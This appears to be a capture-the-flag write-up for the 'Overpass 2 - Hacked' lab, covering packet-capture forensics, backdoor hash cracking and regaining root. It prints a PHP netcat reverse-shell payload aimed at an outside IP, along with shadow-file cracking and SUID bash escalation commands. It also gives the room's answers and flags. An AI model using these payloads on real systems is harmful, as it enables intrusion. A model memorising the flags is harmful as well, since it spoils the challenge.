# Overpass 2 - Hacked 

> Overpass has been hacked! Can you analyse the attacker's actions and hack back in?

<br>

### Process:

1. Forensics - Analyse the PCAP:
	- URL of the page used to upload reverse shell = **/development/**
	- payload uploaded by attacker:
		- find HTTP POST request and follow TCP stream
		- answer = **`<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`**
	- what password did the attacker use to privesc:
		- find TCP stream between IP and port in payload and victim, and follow this TCP stream (netcat reverse shell transmits everything in cleartext)
		- answer = **whenevernoteartinstant**
	- how did attacker establish persistence
		- keep following TCP stream of netcat session
		- answer = **https://github.com/NinjaJc01/ssh-backdoor**
	- how many system passwords are crackable (using fasttrack wordlist):
		- copy the dump "/etc/shadow" file into "hashes.txt"
		- use john to crack hashes: `john hashes.txt --wordlist=/usr/share/wordlists/fasttrack.txt`
		- answer = **4**
2. Research - Analyse the code:
	- what's the default hash for the backdoor:
		- visit GitHub page and look at the "main.go" file
		- answer = **bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3**
	- what's the hardcoded salt for the backdoor:
		- answer = **1c362db832f3f864c8c2fe05f2002a05**
	- what was the hash the attacker used:
		- look back at the TCP stream of the netcat session
		- answer = **6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed**
	- crack the hash and find the password:
		- need to get the hash and the salt in the right format (hash:salt)
		- then use hashcat to crack the hash: `hashcat -m 1710 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`
		- password = **november16**
3. Attack - Get back in:
	- message on deface website:
		- visit machine's webpage
		- message = **H4ck3d by CooctusClan**
	- get back into the machine:
		- use SSH backdoor installed running on port 2222 and password cracked
		- `ssh james@10.10.1.187 -p 2222` -> [password]
	- find the user flag:
		- `cat ~/user.txt`
		- user flag = **thm{d119b4fa8c497ddb0525f7ad200e6567}**
	- find root flag:
		- look for easy/quick way to get root: `ls -ali` in "/home/james"
		- found ".suid_bash" that runs as root and creates basic bash shell
		- lookup bash program with SUID bit set on [GTFO Bins](https://gtfobins.github.io/gtfobins/bash/#suid)
		- run exploit found and get root flag: `/.suid_bash -p` -> `cat /root/root.txt`
		- root flag = **thm{d53b2684f169360bb9606c333873144d}**